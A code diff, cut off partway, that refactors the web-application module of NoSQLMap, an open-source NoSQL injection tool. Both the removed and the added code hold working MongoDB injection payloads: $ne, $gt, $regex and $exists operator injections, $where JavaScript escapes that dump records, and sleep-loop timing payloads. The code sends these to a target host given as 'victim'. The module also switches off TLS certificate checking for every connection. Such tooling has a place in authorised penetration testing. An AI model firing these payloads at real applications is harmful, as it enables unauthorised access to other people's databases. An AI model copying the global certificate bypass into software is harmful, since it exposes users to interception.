@@ -2,60 +2,33 @@
 # NoSQLMap Copyright 2012-2017 NoSQLMap Development team
 # See the file 'doc/COPYING' for copying permission
 
+"""NoSQL injection attacks against web applications (GET and POST).
 
-from .exceptions import NoSQLMapException
-import urllib.request
-import urllib.parse
-import urllib.error
-import string
-from . import mongodb
-import datetime
-import time
+Structure
+---------
+* The payloads are *data*, not code: :data:`GET_PAYLOADS` holds one query
+  fragment per test and :data:`GET_TESTS` / :data:`POST_TESTS` describe each
+  attack step.  The attack functions walk those tables instead of repeating
+  a block of boilerplate per payload.
+* :class:`WebClient` owns the HTTP plumbing (requests, responses, timing).
+* Findings are collected in a :class:`Findings` instance that is passed
+  explicitly around instead of through module globals.
+"""
+
 import random
+import string
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
 
-# Fix for dealing with self-signed certificates.  This is wrong and highly discouraged, to be revisited in stable branch
+from . import mongodb
 
+# Fix for dealing with self-signed certificates.  This is wrong and highly
+# discouraged, to be revisited in a stable branch.
 import ssl
 
 ssl._create_default_https_context = ssl._create_unverified_context
-
-
-def save_to(savePath, vulnAddrs, possAddrs, strTbAttack, intTbAttack):
-    fo = open(savePath, "w")
-    fo.write("Vulnerable URLs:\n")
-    fo.write("\n".join(decode_payloads(vulnAddrs)))
-    fo.write("\n\n")
-    fo.write("Possibly Vulnerable URLs:\n")
-    fo.write("\n".join(decode_payloads(possAddrs)))
-    fo.write("\n")
-    fo.write("Timing based attacks:\n")
-
-    if strTbAttack == True:
-        fo.write("String Attack-Successful\n")
-    else:
-        fo.write("String Attack-Unsuccessful\n")
-    fo.write("\n")
-
-    if intTbAttack == True:
-        fo.write("Integer attack-Successful\n")
-    else:
-        fo.write("Integer attack-Unsuccessful\n")
-    fo.write("\n")
-    fo.close()
-
-
-def decode_payloads(addrs):
-    """Return ``addrs`` with each URL's query string decoded so the injection
-    payload is human-readable (e.g. ``acctid[$ne]=...`` instead of
-    ``acctid%5B%24ne%5D=...``). Non-URL entries (e.g. POST-data dict strings)
-    are passed through unchanged."""
-    decoded = []
-    for addr in addrs:
-        if isinstance(addr, str) and "?" in addr:
-            path, _, query = addr.partition("?")
-            addr = path + "?" + urllib.parse.unquote_plus(query)
-        decoded.append(addr)
-    return decoded
 
 
 def args():
@@ -72,425 +45,181 @@ def args():
     ]
 
 
-def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
-    print("Web App Attacks (GET)")
-    print("===============")
-    paramName = []
-    global testNum
-    global httpMethod
-    httpMethod = "GET"
-    testNum = 1
-    paramValue = []
-    global vulnAddrs
-    vulnAddrs = []
-    global possAddrs
-    possAddrs = []
-    timeVulnsStr = []
-    timeVulnsInt = []
-    appUp = False
-    strTbAttack = False
-    intTbAttack = False
-    trueStr = False
-    trueInt = False
-    global lt24
-    lt24 = False
-    global str24
-    str24 = False
-    global int24
-    int24 = False
+# The per-payload GET URL table, populated by :func:`buildUri` (index ==
+# payload index) and read by the GET attack and the DB-info brute force.
+uriArray = []
 
-    # Verify app is working.
-    print(
-        "Checking to see if site at "
-        + str(victim).strip()
-        + ":"
-        + str(webPort).strip()
-        + str(uri).strip()
-        + " is up..."
-    )
+# ---------------------------------------------------------------------------
+# Payload tables
+# ---------------------------------------------------------------------------
 
-    if https == "OFF":
-        appURL = (
-            "http://"
-            + str(victim).strip()
-            + ":"
-            + str(webPort).strip()
-            + str(uri).strip()
-        )
+# The 10 second sleep loop shared by the GET timing payloads.
+_SLEEP = (
+    "var date = new Date(); var curDate = null; do { curDate = new Date(); } "
+    "while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; "
+)
 
-    elif https == "ON":
-        appURL = (
-            "https://"
-            + str(victim).strip()
-            + ":"
-            + str(webPort).strip()
-            + str(uri).strip()
-        )
+# One entry per injection payload, in the order the tests expect.  Each entry
+# is a query-fragment template: ``{p}`` is replaced by the injected parameter
+# name and ``{r}`` by the random baseline value.  Plain ``str.replace`` (not
+# ``str.format``) is used so the JS braces in the sleep payloads stay intact.
+GET_PAYLOADS = [
+    "{p}={r}",                                            # 0  random baseline
+    "{p}[$ne]=",                                          # 1  BSON $ne (empty value)
+    "{p}=a'; return db.a.find(); var dummy='!",           # 2  $where string escape, find()
+    "{p}=1; return db.a.find(); var dummy=1",             # 3  $where integer escape, find()
+    "{p}=a'; return db.a.findOne(); var dummy='!",        # 4  $where string escape, findOne()
+    "{p}=1; return db.a.findOne(); var dummy=1",          # 5  $where integer escape, findOne()
+    "{p}=a'; return this.a != '{r}'; var dummy='!",       # 6  $where this != string escape
+    "{p}=1; return this.a !={r}; var dummy=1",            # 7  $where this != integer escape
+    "{p}[$gt]=",                                          # 8  BSON $gt (empty value)
+    "{p}=1; " + _SLEEP + "var dummy=1",                   # 9  timing (integer escape)
+    '{p}=a"; return db.a.find(); var dummy=\'!',          # 10 double-quote, find()
+    '{p}=a"; return this.a != \'{r}\'; var dummy=\'!',    # 11 double-quote, this !=
+    '{p}=a"; return db.a.findOne(); var dummy="\'!',      # 12 double-quote, findOne()
+    '{p}=a"; ' + _SLEEP + 'var dummy="\'!',               # 13 timing (double-quote)
+    "{p}a'; return true; var dum='a",                     # 14 string escape, return true (no =)
+    "{p}1; return true; var dum=2",                       # 15 integer, return true (no =)
+    "{p}=a'; ---",                                        # 16 DB-info template (--- replaced by getDBInfo)
+    "{p}=1; if ---",                                      # 17 DB-info template (numeric if)
+    "{p}=a'; " + _SLEEP + "var dummy='!",                 # 18 timing (string escape)
+    "{p}[$regex]=",                                       # 19 BSON $regex (empty value)
+    "{p}[$exists]=",                                      # 20 BSON $exists (empty value)
+]
+
+# The GET attack: (test number, short label, payload index into uriArray,
+# verbose message).  The loop in ``getApps`` walks this table.
+GET_TESTS = [
+    (1, "PHP/ExpressJS != associative array injection", 1,
+     "Testing Mongo PHP not equals associative array injection using {uri}..."),
+    (2, "$where injection (string escape)", 2,
+     "Testing Mongo <2.4 $where all Javascript string escape attack for all records... Injecting {uri}"),
+    (3, "$where injection (integer escape)", 3,
+     "Testing Mongo <2.4 $where Javascript integer escape attack for all records... Injecting {uri}"),
+    (4, "$where injection string escape (single record)", 4,
+     "Testing Mongo <2.4 $where all Javascript string escape attack for one record... Injecting {uri}"),
+    (5, "$where injection integer escape (single record)", 5,
+     "Testing Mongo <2.4 $where Javascript integer escape attack for one record... Injecting {uri}"),
+    (6, "This != injection (string escape)", 6,
+     "Testing Mongo this not equals string escape attack for all records... Injecting {uri}"),
+    (7, "This != injection (integer escape)", 7,
+     "Testing Mongo this not equals integer escape attack for all records... Injecting {uri}"),
+    (8, "PHP/ExpressJS > Undefined Injection", 8,
+     "Testing PHP/ExpressJS > undefined attack for all records... Injecting {uri}"),
+    (9, "PHP/ExpressJS [$regex] associative array injection", 19,
+     "Testing PHP/ExpressJS [$regex] associative array injection... Injecting {uri}"),
+    (10, "PHP/ExpressJS [$exists] associative array injection", 20,
+     "Testing PHP/ExpressJS [$exists] associative array injection... Injecting {uri}"),
+]
+
+# The POST attack: (test number, short label, payload spec, verbose message).
+# A payload spec is either "ne"/"gt" (the parameter is replaced by
+# ``param[$ne]`` / ``param[$gt]`` with an empty value) or a value template in
+# which ``{r}`` is replaced by the random baseline value.
+POST_TESTS = [
+    (1, "PHP/ExpressJS != associative array injection", "ne",
+     "Testing Mongo PHP not equals associative array injection using {data}..."),
+    (2, "PHP/ExpressJS > Undefined Injection", "gt",
+     "Testing PHP/ExpressJS > undefined injection using {data}..."),
+    (3, "$where injection (string escape)", "a'; return db.a.find(); var dummy='!",
+     "Testing Mongo <2.4 $where all Javascript string escape attack for all records... Injecting {data}"),
+    (4, "$where injection (integer escape)", "1; return db.a.find(); var dummy=1",
+     "Testing Mongo <2.4 $where Javascript integer escape attack for all records... Injecting {data}"),
+    (5, "$where injection string escape (single record)", "a'; return db.a.findOne(); var dummy='!",
+     "Testing Mongo <2.4 $where all Javascript string escape attack for one record... Injecting {data}"),
+    (6, "$where injection integer escape (single record)", "1; return db.a.findOne(); var dummy=1",
+     "Testing Mongo <2.4 $where Javascript integer escape attack for one record... Injecting {data}"),
+    (7, "This != injection (string escape)", "a'; return this.a != '{r}'; var dummy='!",
+     "Testing Mongo this not equals string escape attack for all records... Injecting {data}"),
+    (8, "This != injection (integer escape)", "1; return this.a != '{r}'; var dummy=1",
+     "Testing Mongo this not equals integer escape attack for all records... Injecting {data}"),
+]
+
+# The POST timing payloads differ slightly from the GET ones (argument order
+# in the sleep loop and the trailing return), so they are kept verbatim.
+POST_TIMING_STRING = (
+    "a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } "
+    "while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"
+)
+POST_TIMING_INTEGER = (
+    "1; var date = new Date(); var curDate = null; do { curDate = new Date(); } "
+    "while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"
+)
+
+# Response fragments that indicate the injection reached the database engine.
+_ERROR_MARKERS = ("ReferenceError", "SyntaxError", "ILLEGAL")
+
+
+def _render(template, name, rand_value):
+    """Substitute the ``{p}``/``{r}`` placeholders in a payload template."""
+    return template.replace("{p}", name).replace("{r}", rand_value)
+
+
+def buildUri(origUri, randValue, args=None):
+    """Build the per-payload URL table and return the random baseline URL.
+
+    Splits ``origUri`` into path and query parameters, lets the user select
+    the parameter(s) to inject, then builds one URL per :data:`GET_PAYLOADS`
+    entry: selected parameters get the payload, the others keep their
+    original value.  The full table is stored in the module-level
+    ``uriArray`` (index == payload index); the baseline (index 0) is
+    returned.
+    """
+    global uriArray
+
+    path, _, query = origUri.partition("?")
+    params = urllib.parse.parse_qsl(query, keep_blank_values=True)
+
+    print("List of parameters:")
+    for i, (name, _) in enumerate(params, start=1):
+        print(str(i) + "-" + name)
+
+    if args is None:
+        inj_index = input("Enter parameters to inject in a comma separated list:  ")
+    else:
+        inj_index = args.params
+
     try:
-        req = urllib.request.Request(appURL, None, requestHeaders)
-        appRespCode = urllib.request.urlopen(req).getcode()
-        if appRespCode == 200:
-            normLength = int(len(getResponseBodyHandlingErrors(req)))
-            timeReq = urllib.request.urlopen(req)
-            start = time.time()
-            page = timeReq.read()
-            end = time.time()
-            timeReq.close()
-            timeBase = round((end - start), 3)
+        inj_opt = [params[int(i) - 1][0] for i in inj_index.split(",")]
+    except (ValueError, IndexError):
+        if args is None:
+            input("Something went wrong.  Press enter to return to the main menu...")
+        return ()
 
-            if verb == "ON":
-                print(
-                    "App is up! Got response length of "
-                    + str(normLength)
-                    + " and response time of "
-                    + str(timeBase)
-                    + " seconds.  Starting injection test.\n"
-                )
-            else:
-                print("App is up!")
-            appUp = True
+    for name in inj_opt:
+        print("Injecting the " + name + " parameter...")
 
-        else:
-            print("Got " + str(appRespCode) + "from the app, check your options.")
-    except NoSQLMapException as e:
-        print(e)
-        print("Looks like the server didn't respond.  Check your options.")
+    uriArray = []
+    for template in GET_PAYLOADS:
+        fragments = [
+            _render(template, name, randValue) if name in inj_opt else name + "=" + value
+            for name, value in params
+        ]
+        uriArray.append(path + "?" + urllib.parse.quote_plus("&".join(fragments)))
 
-    if appUp == True:
+    return uriArray[0]
 
-        if args == None:
-            sizeSelect = True
 
-            while sizeSelect:
-                injectSize = input("Baseline test-Enter random string size: ")
-                sizeSelect = not injectSize.isdigit()
-                if sizeSelect:
-                    print("Invalid! The size should be an integer.")
+def _post_data(base, param, spec, rand_value):
+    """Build a fresh POST-data dict for one test (``base`` is not mutated)."""
+    data = dict(base)
+    data.pop(param, None)
+    if spec == "ne":
+        data[param + "[$ne]"] = ""
+    elif spec == "gt":
+        data[param + "[$gt]"] = ""
+    else:
+        data[param] = spec.replace("{r}", rand_value)
+    return data
 
-            format = randInjString(int(injectSize))
-        else:
-            injectSize = int(args.injectSize)
-            format = args.injectFormat
 
-        injectSize = int(injectSize)
-        injectString = build_random_string(format, injectSize)
+def _post_body(data):
+    return urllib.parse.urlencode(data).encode("utf-8")
 
-        print("Using " + injectString + " for injection testing.\n")
 
-        # Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
-        if "?" not in appURL:
-            print("No URI parameters provided for GET request...Check your options.\n")
-            if args == None:
-                input("Press enter to continue...")
-            return ()
-
-        randomUri = buildUri(appURL, injectString, args)
-        print("URI : " + randomUri)
-        req = urllib.request.Request(randomUri, None, requestHeaders)
-
-        if verb == "ON":
-            print(
-                "Checking random injected parameter HTTP response size using "
-                + randomUri
-                + "...\n"
-            )
-        else:
-            print("Sending random parameter value...")
-
-        responseBody = getResponseBodyHandlingErrors(req)
-        randLength = int(len(responseBody))
-
-        print("Got response length of " + str(randLength) + ".")
-        randNormDelta = abs(normLength - randLength)
-
-        if randNormDelta == 0:
-            print("No change in response size injecting a random parameter..\n")
-        else:
-            print("Random value variance: " + str(randNormDelta) + "\n")
-
-        if verb == "ON":
-            print(
-                "Testing Mongo PHP not equals associative array injection using "
-                + uriArray[1]
-                + "..."
-            )
-        else:
-            print("Test 1: PHP/ExpressJS != associative array injection")
-
-        # Test for errors returned by injection
-        req = urllib.request.Request(uriArray[1], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None)
-            testNum += 1
-        else:
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print(
-                "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
-            )
-            print("Injecting " + uriArray[2])
-        else:
-            print("Test 2: $where injection (string escape)")
-
-        print(uriArray[2])
-        req = urllib.request.Request(uriArray[2], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None)
-            testNum += 1
-
-        else:
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print(
-                "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
-            )
-            print("Injecting " + uriArray[3])
-        else:
-            print("Test 3:  $where injection (integer escape)")
-
-        req = urllib.request.Request(uriArray[3], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None)
-            testNum += 1
-
-        else:
-            testNum += 1
-
-        # Start a single record attack in case the app expects only one record back
-        print("\n")
-        if verb == "ON":
-            print(
-                "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
-            )
-            print(" Injecting " + uriArray[4])
-        else:
-            print("Test 4: $where injection string escape (single record)")
-
-        req = urllib.request.Request(uriArray[4], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None)
-            testNum += 1
-        else:
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print(
-                "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
-            )
-            print(" Injecting " + uriArray[5])
-        else:
-            print("Test 5: $where injection integer escape (single record)")
-
-        req = urllib.request.Request(uriArray[5], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None)
-            testNum += 1
-
-        else:
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print(
-                "Testing Mongo this not equals string escape attack for all records..."
-            )
-            print(" Injecting " + uriArray[6])
-        else:
-            print("Test 6: This != injection (string escape)")
-
-        req = urllib.request.Request(uriArray[6], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None)
-            testNum += 1
-        else:
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print(
-                "Testing Mongo this not equals integer escape attack for all records..."
-            )
-            print(" Injecting " + uriArray[7])
-        else:
-            print("Test 7: This != injection (integer escape)")
-
-        req = urllib.request.Request(uriArray[7], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None)
-            testNum += 1
-        else:
-            testNum += 1
-        print("\n")
-
-        if verb == "ON":
-            print("Testing  PHP/ExpressJS > undefined attack for all records...")
-            print("Injecting " + uriArray[8])
-
-        else:
-            print("Test 8: PHP/ExpressJS > Undefined Injection")
-
-        req = urllib.request.Request(uriArray[8], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None)
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print("Testing PHP/ExpressJS [$regex] associative array injection...")
-            print("Injecting " + uriArray[19])
-        else:
-            print("Test 9: PHP/ExpressJS [$regex] associative array injection")
-
-        req = urllib.request.Request(uriArray[19], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum, 19)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None, 19)
-            testNum += 1
-        else:
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print("Testing PHP/ExpressJS [$exists] associative array injection...")
-            print("Injecting " + uriArray[20])
-        else:
-            print("Test 10: PHP/ExpressJS [$exists] associative array injection")
-
-        req = urllib.request.Request(uriArray[20], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum, 20)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None, 20)
-            testNum += 1
-        else:
-            testNum += 1
-
-        if args == None:
-            doTimeAttack = input("Start timing based tests (y/n)? ")
-        else:
-            # ``--doTimeAttack`` is optional; default to "n" (no timing tests)
-            # when it is not supplied, matching the behaviour of ``postApps``.
-            doTimeAttack = args.doTimeAttack or "n"
-
-        if doTimeAttack.lower() == "y":
-            print("Starting Javascript string escape time based injection...")
-            req = urllib.request.Request(uriArray[18], None, requestHeaders)
-            start = time.time()
-            page = getResponseBodyHandlingErrors(req)
-            end = time.time()
-            strTimeDelta = int(round((end - start), 3)) - timeBase
-            if strTimeDelta > 25:
-                print(
-                    "HTTP load time variance was "
-                    + str(strTimeDelta)
-                    + " seconds! Injection possible."
-                )
-                strTbAttack = True
-
-            else:
-                print(
-                    "HTTP load time variance was only "
-                    + str(strTimeDelta)
-                    + " seconds.  Injection probably didn't work."
-                )
-                strTbAttack = False
-
-            print("Starting Javascript integer escape time based injection...")
-            req = urllib.request.Request(uriArray[9], None, requestHeaders)
-            start = time.time()
-            page = getResponseBodyHandlingErrors(req)
-            end = time.time()
-            intTimeDelta = int(round((end - start), 3)) - timeBase
-            if intTimeDelta > 25:
-                print(
-                    "HTTP load time variance was "
-                    + str(intTimeDelta)
-                    + " seconds! Injection possible."
-                )
-                intTbAttack = True
-
-            else:
-                print(
-                    "HTTP load time variance was only "
-                    + str(intTimeDelta)
-                    + " seconds.  Injection probably didn't work."
-                )
-                intTbAttack = False
-
-        if lt24 == True:
-            bfInfo = input(
-                "MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? "
-            )
-
-            if bfInfo.lower == "y":
-                getDBInfo()
-
-        print("\n")
-        print("Vulnerable URLs:")
-        print("\n".join(decode_payloads(vulnAddrs)))
-        print("\n")
-        print("Possibly vulnerable URLs:")
-        print("\n".join(decode_payloads(possAddrs)))
-        print("\n")
-        print("Timing based attacks:")
-
-        if strTbAttack == True:
-            print("String attack-Successful")
-        else:
-            print("String attack-Unsuccessful")
-        if intTbAttack == True:
-            print("Integer attack-Successful")
-        else:
-            print("Integer attack-Unsuccessful")
-
-        if args == None:
-            fileOut = input("Save results to file (y/n)? ")
-        else:
-            fileOut = "y" if args.savePath else "n"
-
-        if fileOut.lower() == "y":
-            if args == None:
-                savePath = input("Enter output file name: ")
-            else:
-                savePath = args.savePath
-            save_to(savePath, vulnAddrs, possAddrs, strTbAttack, intTbAttack)
-
-    if args == None:
-        input("Press enter to continue...")
-    return ()
-
+# ---------------------------------------------------------------------------
+# HTTP plumbing
+# ---------------------------------------------------------------------------
 
 def getResponseBodyHandlingErrors(req):
     try:
@@ -505,486 +234,80 @@ def getResponseBodyHandlingErrors(req):
     return responseBody.decode("utf-8", errors="replace")
 
 
-def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=None):
-    print("Web App Attacks (POST)")
-    print("===============")
-    paramName = []
-    paramValue = []
-    global vulnAddrs
-    global httpMethod
-    httpMethod = "POST"
-    vulnAddrs = []
-    global possAddrs
-    possAddrs = []
-    timeVulnsStr = []
-    timeVulnsInt = []
-    appUp = False
-    strTbAttack = False
-    intTbAttack = False
-    trueStr = False
-    trueInt = False
-    global neDict
-    global gtDict
-    testNum = 1
+class WebClient:
+    """Owns the HTTP plumbing so the attack functions stay declarative."""
 
-    # Verify app is working.
-    print(
-        "Checking to see if site at "
-        + str(victim)
-        + ":"
-        + str(webPort)
-        + str(uri)
-        + " is up..."
-    )
+    def __init__(self, url, request_headers):
+        self.url = url
+        self.headers = request_headers
 
-    if https == "OFF":
-        appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+    def _request(self, url, data):
+        return urllib.request.Request(url, data, self.headers)
 
-    elif https == "ON":
-        appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
+    def probe(self, data=None):
+        """Hit the base URL once.
 
-    try:
-        body = urllib.parse.urlencode(postData).encode("utf-8")
-        req = urllib.request.Request(appURL, body, requestHeaders)
-        appRespCode = urllib.request.urlopen(req).getcode()
-
-        if appRespCode == 200:
-
-            normLength = int(len(getResponseBodyHandlingErrors(req)))
-            timeReq = urllib.request.urlopen(req)
-            start = time.time()
-            page = timeReq.read()
-            end = time.time()
-            timeReq.close()
-            timeBase = round((end - start), 3)
-
-            if verb == "ON":
-                print(
-                    "App is up! Got response length of "
-                    + str(normLength)
-                    + " and response time of "
-                    + str(timeBase)
-                    + " seconds.  Starting injection test.\n"
-                )
-
-            else:
-                print("App is up!")
-            appUp = True
-        else:
-            print("Got " + str(appRespCode) + "from the app, check your options.")
-
-    except NoSQLMapException as e:
-        print(e)
-        print("Looks like the server didn't respond.  Check your options.")
-
-    if appUp == True:
-
-        menuItem = 1
-        print("List of parameters:")
-        for params in postData.keys():
-            print(str(menuItem) + "-" + params)
-            menuItem += 1
-
+        Returns ``(status_code, body, elapsed_seconds)``; ``(None, None,
+        None)`` when the connection itself failed (message already printed).
+        Non-2xx responses are returned as-is so the caller can report them.
+        """
+        req = self._request(self.url, data)
+        start = time.time()
         try:
-            if args == None:
-                injIndex = input("Which parameter should we inject? ")
-            else:
-                injIndex = int(args.injectedParameter)
-            injOpt = str(list(postData.keys())[int(injIndex) - 1])
-            print("Injecting the " + injOpt + " parameter...")
-        except NoSQLMapException:
-            if args == None:
-                input(
-                    "Something went wrong.  Press enter to return to the main menu..."
-                )
-            return
+            resp = urllib.request.urlopen(req)
+            code = resp.getcode()
+            raw = resp.read()
+        except urllib.error.HTTPError as err:
+            code = err.code
+            raw = err.read()
+        except urllib.error.URLError as err:
+            print(err)
+            print("Looks like the server didn't respond.  Check your options.")
+            return None, None, None
+        return code, raw.decode("utf-8", errors="replace"), time.time() - start
 
-        if args == None:
-            sizeSelect = True
+    def timed_request(self, url=None, data=None):
+        """Send a request and return ``(body, elapsed_seconds)``."""
+        req = self._request(url or self.url, data)
+        start = time.time()
+        body = getResponseBodyHandlingErrors(req)
+        return body, time.time() - start
 
-            while sizeSelect:
-                injectSize = input("Baseline test-Enter random string size: ")
-                sizeSelect = not injectSize.isdigit()
-                if sizeSelect:
-                    print("Invalid! The size should be an integer.")
-
-            format = randInjString(int(injectSize))
-        else:
-            injectSize = int(args.injectSize)
-            format = args.injectFormat
-
-        injectSize = int(injectSize)
-        injectString = build_random_string(format, injectSize)
-
-        print("Using " + injectString + " for injection testing.\n")
-
-        # Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
-        # Add error handling for Non-200 HTTP response codes if random strings freak out the app.
-        postData.update({injOpt: injectString})
-        if verb == "ON":
-            print(
-                "Checking random injected parameter HTTP response size sending "
-                + str(postData)
-                + "...\n"
-            )
-        else:
-            print("Sending random parameter value...")
-
-        body = urllib.parse.urlencode(postData).encode("utf-8")
-        req = urllib.request.Request(appURL, body, requestHeaders)
-        randLength = int(len(getResponseBodyHandlingErrors(req)))
-        print("Got response length of " + str(randLength) + ".")
-
-        randNormDelta = abs(normLength - randLength)
-
-        if randNormDelta == 0:
-            print("No change in response size injecting a random parameter..\n")
-        else:
-            print("Random value variance: " + str(randNormDelta) + "\n")
-
-        # Generate not equals injection
-        neDict = postData
-        neDict[injOpt + "[$ne]"] = neDict[injOpt]
-        del neDict[injOpt]
-        body = urllib.parse.urlencode(neDict)
-        req = urllib.request.Request(appURL, body, requestHeaders)
-        if verb == "ON":
-            print(
-                "Testing Mongo PHP not equals associative array injection using "
-                + str(postData)
-                + "..."
-            )
-
-        else:
-            print("Test 1: PHP/ExpressJS != associative array injection")
-
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, postData)
-            testNum += 1
-
-        else:
-            testNum += 1
-        print("\n")
-
-        # Delete the extra key
-        del postData[injOpt + "[$ne]"]
-
-        # generate $gt injection
-        gtDict = postData
-        gtDict.update({injOpt: ""})
-        gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
-        del gtDict[injOpt]
-        body = urllib.parse.urlencode(gtDict)
-        req = urllib.request.Request(appURL, body, requestHeaders)
-        if verb == "ON":
-            print(
-                "Testing PHP/ExpressJS >Undefined Injection using "
-                + str(postData)
-                + "..."
-            )
-
-        else:
-            print("Test 2:  PHP/ExpressJS > Undefined Injection")
-
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, postData)
-            testNum += 1
-
-        postData.update({injOpt: "a'; return db.a.find(); var dummy='!"})
-        body = urllib.parse.urlencode(postData)
-        req = urllib.request.Request(appURL, body, requestHeaders)
-        if verb == "ON":
-            print(
-                "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
-            )
-            print("Injecting " + str(postData))
-
-        else:
-            print("Test 3: $where injection (string escape)")
-
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, postData)
-            testNum += 1
-        else:
-            testNum += 1
-
-        print("\n")
-
-        postData.update({injOpt: "1; return db.a.find(); var dummy=1"})
-        body = urllib.parse.urlencode(postData)
-        req = urllib.request.Request(appURL, body, requestHeaders)
-        if verb == "ON":
-            print(
-                "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
-            )
-            print("Injecting " + str(postData))
-        else:
-            print("Test 4: $where injection (integer escape)")
-
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, postData)
-            testNum += 1
-        else:
-            testNum += 1
-        print("\n")
-
-        # Start a single record attack in case the app expects only one record back
-        postData.update({injOpt: "a'; return db.a.findOne(); var dummy='!"})
-        body = urllib.parse.urlencode(postData)
-        req = urllib.request.Request(appURL, body, requestHeaders)
-        if verb == "ON":
-            print(
-                "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
-            )
-            print(" Injecting " + str(postData))
-
-        else:
-            print("Test 5: $where injection string escape (single record)")
-
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, postData)
-            testNum += 1
-
-        else:
-            testNum += 1
-        print("\n")
-
-        postData.update({injOpt: "1; return db.a.findOne(); var dummy=1"})
-        body = urllib.parse.urlencode(postData)
-        req = urllib.request.Request(appURL, body, requestHeaders)
-        if verb == "ON":
-            print(
-                "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
-            )
-            print(" Injecting " + str(postData))
-
-        else:
-            print("Test 6: $where injection integer escape (single record)")
-
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, postData)
-            testNum += 1
-
-        else:
-            testNum += 1
-        print("\n")
-
-        postData.update(
-            {injOpt: "a'; return this.a != '" + injectString + "'; var dummy='!"}
-        )
-        body = urllib.parse.urlencode(postData)
-        req = urllib.request.Request(appURL, body, requestHeaders)
-
-        if verb == "ON":
-            print(
-                "Testing Mongo this not equals string escape attack for all records..."
-            )
-            print(" Injecting " + str(postData))
-
-        else:
-            print("Test 7: This != injection (string escape)")
-
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, postData)
